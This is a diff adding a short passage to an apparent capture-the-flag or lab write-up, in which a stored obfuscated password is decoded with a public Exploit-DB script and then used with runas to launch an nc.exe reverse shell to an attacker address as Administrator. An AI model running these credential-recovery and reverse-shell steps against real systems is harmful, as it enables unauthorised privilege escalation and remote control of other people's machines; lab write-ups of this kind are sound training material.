@@ -164,3 +164,42 @@ Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
 ```
 
 now, how do we decode this password?
+
+50130.py - neat.
+https://www.exploit-db.com/exploits/50130
+
+```bash
+nano 50130.py
+# edit and add our password
+
+python 50130.py
+
+
+[+] ECB4:1
+[+] 53D1:4
+[+] 6069:W
+[+] F641:a
+[+] E03B:t
+[+] D9BD:c
+[+] 956B:h
+[+] FE36:D
+[+] BD8F:0
+[+] 3CD9:g
+[-] D9A8:Unknown
+
+```
+
+`14WatchD0g$`, I am assuming.
+
+now we can run this to connect to our reverse shell.
+
+```
+nc -nvlp 4444
+
+runas /user:Administrator "nc.exe -e cmd.exe 192.168.49.52 4444"
+14WatchD0g$
+
+
+```
+
+we have root flag.
